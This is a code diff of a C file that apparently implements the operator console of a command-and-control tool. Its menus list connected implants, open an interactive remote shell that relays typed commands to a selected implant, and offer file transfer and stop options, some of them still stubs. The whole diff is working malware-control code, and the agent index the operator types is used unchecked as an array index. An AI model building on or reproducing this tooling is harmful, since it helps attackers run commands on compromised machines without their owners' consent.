@@ -23,9 +23,6 @@ It will pass commands to the message handler and receive responses from the mess
 #include "listener_handler.h"
 
 // Global variables
-// Agents poll and states
-extern Connected_Agents *connected_agents;
-extern pthread_mutex_t agents_lock;
 // Receive Queue
 extern Queue* listener_receive_queue;
 extern pthread_mutex_t listener_receive_queue_lock;
@@ -40,43 +37,98 @@ extern volatile sig_atomic_t shell_flag;
 #define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
 #define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - stop agent\n5 - go back\n"
 
-STATIC int agent_console(int agent_fd){
-	char opt_buf[BUFFERSIZE];
-	char command_buf[BUFFERSIZE];
+STATIC int shell_console(int agent_fd){
+	int retval;
+	char command_buf[FIRST_PAYLOAD_SIZE];
 	char* buffer;
-	long option;
-				 
-	while(fgets(opt_buf, BUFFERSIZE - 1, stdin)){
-		print_out(AGENT_MENU, agent_fd);
-		option = strtol(opt_buf, NULL, 10);
-		switch(option){
-	        case 1:
-				printf("Ctrl-c to leave shell\n");
-				shell_flag = true;
-				while (!shell_sigint){
-					print_out("%s\n", "Command");
-					buffer = malloc(BUFFERSIZE);
-					memset(command_buf, 0, BUFFERSIZE);
-	        		fgets(command_buf, BUFFERSIZE, stdin);
-					memcpy(buffer, command_buf, BUFFERSIZE);
+    fd_set console_fds;
+    struct timeval tv;
 
-					listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strlen(buffer));
-				}
-				shell_sigint = false;
-				shell_flag = false;
-	        	break;
-	        case 2:
-	        	break;
-	        case 3:
-	        	break;
-	        case 4:
-	        	break;
-	        case 5:
-	        	return 0;
-	        default:
-	        	print_out("%s\n", "Unknown option selected");
-	        	break;
-	    }
+	printf("Ctrl-c to restart shell\nexit to leave shell running");
+	print_out("%s", "");
+
+	shell_flag = true;
+	while (!shell_sigint){
+
+		tv.tv_sec = SELECT_TIMEOUT;
+		tv.tv_usec = 0;
+		FD_ZERO(&console_fds);
+		FD_SET(STDIN, &console_fds);
+
+		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
+        if (retval == -1){
+            printf("select error, shell_console\n");
+			all_sigint = true;
+			return RET_ERROR;
+        }
+		else if (FD_ISSET(STDIN, &console_fds)){
+			memset(command_buf, 0, FIRST_PAYLOAD_SIZE);
+			if (!fgets(command_buf, FIRST_PAYLOAD_SIZE, stdin)){
+				printf("fgets error\n");
+				all_sigint = true;
+				return RET_ERROR;
+			}
+
+			buffer = malloc(FIRST_PAYLOAD_SIZE);
+			memset(buffer, 0, FIRST_PAYLOAD_SIZE);
+			memcpy(buffer, command_buf, FIRST_PAYLOAD_SIZE);
+
+			listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strnlen(buffer, FIRST_PAYLOAD_SIZE));
+			print_out("%s\n", "");
+		}
+	}
+	shell_sigint = false;
+	shell_flag = false;
+
+	return RET_OK;
+}
+
+STATIC int agent_console(int agent_fd){
+	int retval;
+	char opt_buf[FIRST_PAYLOAD_SIZE];
+	long option;
+    fd_set console_fds;
+    struct timeval tv;
+
+	print_out(AGENT_MENU, agent_fd);
+				 
+	while(!all_sigint){
+		tv.tv_sec = SELECT_TIMEOUT;
+    	tv.tv_usec = 0;
+    	FD_ZERO(&console_fds);
+    	FD_SET(STDIN, &console_fds);
+
+		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
+        if (retval == -1){
+            printf("select error, agent_console\n");
+			all_sigint = true;
+			return RET_ERROR;
+        }
+		else if (FD_ISSET(STDIN, &console_fds)){
+			if (!fgets(opt_buf, FIRST_PAYLOAD_SIZE, stdin)){
+				printf("fgets error\n");
+				all_sigint = true;
+				return RET_ERROR;
+			}
+			option = strtol(opt_buf, NULL, 10);
+			switch(option){
+				case 1:
+					shell_console(agent_fd);
+					break;
+				case 2:
+					break;
+				case 3:
+					break;
+				case 4:
+					break;
+				case 5:
+					return 0;
+				default:
+					print_out("%s\n", "Unknown option selected");
+					break;
+			}
+			print_out(AGENT_MENU, agent_fd);
+		}
 	}
 	
 	return 0;
@@ -84,6 +136,7 @@ STATIC int agent_console(int agent_fd){
 
 
 void *console_thread(void *vargp){
+	Connected_Agents* CA = vargp;
 	const char banner[] =	"   ___ _   _   ___ _   _   ________  _________ _       ___   _   _ _____ \n"
 							"  |_  | | | | |_  | | | | |_   _|  \\/  || ___ \\ |     / _ \\ | \\ | |_   _|\n"
 							"    | | | | |   | | | | |   | | | .  . || |_/ / |    / /_\\ \\|  \\| | | |  \n"
@@ -91,7 +144,7 @@ void *console_thread(void *vargp){
 							"/\\__/ / |_| /\\__/ / |_| |  _| |_| |  | || |   | |____| | | || |\\  | | |  \n"
 							"\\____/ \\___/\\____/ \\___/   \\___/\\_|  |_/\\_|   \\_____/\\_| |_/\\_| \\_/ \\_/  \n";
 	int retval;
-	char buffer[BUFFERSIZE];
+	char buffer[FIRST_PAYLOAD_SIZE];
 	long option;
     fd_set console_fds;
     struct timeval tv;
@@ -109,12 +162,12 @@ void *console_thread(void *vargp){
 
 		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
         if (retval == -1){
-            printf("select error\n");
+            printf("select error, console_thread\n");
 			all_sigint = true;
 			break;
         }
 		else if (FD_ISSET(STDIN, &console_fds)){
-			if (!fgets(buffer, BUFFERSIZE, stdin)){
+			if (!fgets(buffer, FIRST_PAYLOAD_SIZE, stdin)){
 				printf("fgets error\n");
 				all_sigint = true;
 				break;
@@ -127,18 +180,18 @@ void *console_thread(void *vargp){
 					break;
 				case 1:
 					printf("\n%s\n", "Active Agents\n-------------");
-					pthread_mutex_lock(&agents_lock);
+					pthread_mutex_lock(&CA->lock);
 					for (int i = 0; i < FDSIZE; i++){
-						if (connected_agents->agents[i].alive) printf(" %d\n", i);
+						if (CA->agents[i].alive) printf(" %d\n", i);
 					}
 					printf("\n");
-					pthread_mutex_unlock(&agents_lock);
+					pthread_mutex_unlock(&CA->lock);
 					break;
 				case 2:
 					printf("Which agent?\n");
-					fgets(buffer, BUFFERSIZE, stdin);
+					fgets(buffer, FIRST_PAYLOAD_SIZE, stdin);
 					option = strtol(buffer, NULL, 10);
-					if (connected_agents->agents[option].alive){
+					if (CA->agents[option].alive){
 						agent_console(option);
 					}
 					else{
@@ -153,6 +206,6 @@ void *console_thread(void *vargp){
         }
 	}
 
-	printf("console_thread done\n");
+	debug_print("%s\n", "console_thread done");
 	return 0;
 }
